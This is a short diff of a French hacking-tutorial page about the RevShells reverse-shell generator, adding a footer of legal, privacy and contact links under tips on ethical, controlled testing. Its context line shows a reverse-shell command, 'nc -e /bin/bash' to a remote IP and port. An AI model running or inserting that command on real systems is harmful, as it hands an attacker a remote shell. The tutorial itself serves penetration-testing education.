@@ -78,3 +78,11 @@ nc -e /bin/bash 10.10.10.10 4444
 * **Test en environnement contrôlé** : Utilisez toujours les reverse shells dans un environnement d'apprentissage ou autorisé.
 * **Configurer le pare-feu local** : Assurez-vous que le port spécifié est ouvert sur votre machine attaquante.
 * **Évitez les abus** : RevShells est conçu pour des tests éthiques et éducatifs uniquement.
+
+***
+
+**Liens utiles :**
+
+* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
+* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
+* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
